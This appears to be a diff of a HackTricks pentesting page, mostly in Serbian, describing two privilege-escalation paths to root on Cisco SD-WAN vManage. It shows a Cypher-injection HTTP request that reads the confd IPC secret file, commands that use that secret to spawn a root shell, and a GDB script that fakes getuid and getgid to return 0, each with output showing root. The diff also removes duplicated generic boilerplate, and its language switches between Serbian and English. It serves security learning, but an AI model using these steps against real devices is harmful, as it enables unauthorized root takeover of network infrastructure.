@@ -1,28 +1,31 @@
 # Cisco - vmanage
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Putanja 1
+## Path 1
 
 (Primer sa [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Nakon malo istraživanja kroz neku [dokumentaciju](http://66.218.245.39/doc/html/rn03re18.html) vezanu za `confd` i različite binarne fajlove (pristupnim sa nalogom na Cisco veb sajtu), otkrili smo da za autentifikaciju IPC socket-a koristi tajnu smeštenu u `/etc/confd/confd_ipc_secret`:
+Nakon što smo malo istražili neku [dokumentaciju](http://66.218.245.39/doc/html/rn03re18.html) vezanu za `confd` i različite binarne datoteke (pristupačne sa nalogom na Cisco veb sajtu), otkrili smo da za autentifikaciju IPC soketa koristi tajnu smeštenu u `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Sećate se naše Neo4j instance? Ona se izvršava pod privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo datoteku koristeći prethodnu ranjivost:
+Zapamtite našu Neo4j instancu? Ona radi pod privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo datoteku koristeći prethodnu ranjivost:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -34,7 +37,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Program `confd_cli` ne podržava argumente komandne linije, već poziva `/usr/bin/confd_cli_user` sa argumentima. Dakle, možemo direktno pozvati `/usr/bin/confd_cli_user` sa sopstvenim setom argumenata. Međutim, nije čitljiv sa našim trenutnim privilegijama, pa ga moramo preuzeti iz rootfs-a i kopirati koristeći scp, pročitati pomoć i koristiti je da bismo dobili shell:
+Program `confd_cli` ne podržava argumente komandne linije, već poziva `/usr/bin/confd_cli_user` sa argumentima. Dakle, mogli bismo direktno pozvati `/usr/bin/confd_cli_user` sa našim skupom argumenata. Međutim, nije čitljiv sa našim trenutnim privilegijama, pa moramo da ga preuzmemo iz rootfs i kopiramo ga koristeći scp, pročitamo pomoć i koristimo ga da dobijemo shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -52,13 +55,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Putanja 2
+## Path 2
 
 (Primer sa [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Blog¹ tima synacktiv opisao je elegantan način za dobijanje root shell-a, ali kvaka je da zahteva kopiranje `/usr/bin/confd_cli_user` koji je samo čitljiv od strane root-a. Pronašao sam drugi način za eskalaciju do root-a bez takvih problema.
+Blog¹ tima synacktiv opisao je elegantan način da se dobije root shell, ali upozorenje je da je potrebno dobiti kopiju `/usr/bin/confd_cli_user` koja je samo čitljiva od strane root-a. Pronašao sam drugi način da se eskaliram na root bez takvih problema.
 
-Kada sam rastavio binarnu datoteku `/usr/bin/confd_cli`, primetio sam sledeće:
+Kada sam dekompajlirao `/usr/bin/confd_cli` binarni fajl, primetio sam sledeće:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -87,20 +90,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Kada pokrenem "ps aux", primetio sam sledeće (_napomena -g 100 -u 107_)
+Kada pokrenem “ps aux”, primetio sam sledeće (_napomena -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Pretpostavio sam da program "confd\_cli" prosleđuje korisnički ID i grupni ID koje je prikupio od prijavljenog korisnika aplikaciji "cmdptywrapper".
+I hypothesized the “confd\_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
 
-Moj prvi pokušaj bio je da direktno pokrenem "cmdptywrapper" i da mu dostavim `-g 0 -u 0`, ali nije uspelo. Izgleda da je negde tokom procesa kreiran file descriptor (-i 1015) i ne mogu ga lažirati.
+My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
 
-Kao što je pomenuto u blogu synacktiv (poslednji primer), program "confd_cli" ne podržava argumente komandne linije, ali mogu ga uticati na njega pomoću debagera i srećom GDB je uključen u sistem.
+As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
 
-Kreirao sam GDB skriptu u kojoj sam prisilio API "getuid" i "getgid" da vrate 0. Pošto već imam privilegije "vmanage" putem RCE deserijalizacije, imam dozvolu da direktno čitam "/etc/confd/confd_ipc_secret".
+I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
 
 root.gdb:
 ```
@@ -120,53 +123,7 @@ root
 end
 run
 ```
-```
-# Cisco vManage Privilege Escalation
-
-## Description
-This technique allows an attacker to escalate privileges on a Cisco vManage device.
-
-## Exploitation
-1. Identify the version of the Cisco vManage software.
-2. Search for any known vulnerabilities or exploits for that version.
-3. Exploit the vulnerability to gain initial access to the device.
-4. Once inside, escalate privileges to gain administrative access.
-
-## Mitigation
-To mitigate this vulnerability, follow these steps:
-1. Keep the Cisco vManage software up to date with the latest patches and updates.
-2. Implement strong access controls and authentication mechanisms.
-3. Regularly monitor and audit the device for any suspicious activity.
-4. Follow best practices for network security and hardening.
-
-## References
-- [Cisco Security Advisories](https://tools.cisco.com/security/center/publicationListing.x)
-- [Cisco vManage Documentation](https://www.cisco.com/c/en/us/support/cloud-systems-management/vmanage/products-installation-guides-list.html)
-```
-
-```
-# Cisco vManage Eskalacija privilegija
-
-## Opis
-Ova tehnika omogućava napadaču da eskalira privilegije na Cisco vManage uređaju.
-
-## Eksploatacija
-1. Identifikujte verziju Cisco vManage softvera.
-2. Pretražite poznate ranjivosti ili eksploate za tu verziju.
-3. Iskoristite ranjivost kako biste dobili početni pristup uređaju.
-4. Jednom unutra, eskalirajte privilegije kako biste dobili administratorski pristup.
-
-## Otklanjanje
-Da biste otklonili ovu ranjivost, sledite ove korake:
-1. Držite Cisco vManage softver ažuriranim sa najnovijim zakrpama i ažuriranjima.
-2. Implementirajte jake kontrole pristupa i mehanizme za autentifikaciju.
-3. Redovno pratite i audirajte uređaj za bilo kakvu sumnjivu aktivnost.
-4. Pratite najbolje prakse za mrežnu sigurnost i ojačavanje.
-
-## Reference
-- [Cisco Security Advisories](https://tools.cisco.com/security/center/publicationListing.x)
-- [Cisco vManage Dokumentacija](https://www.cisco.com/c/en/us/support/cloud-systems-management/vmanage/products-installation-guides-list.html)
-```
+Izlaz konzole:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -200,14 +157,17 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
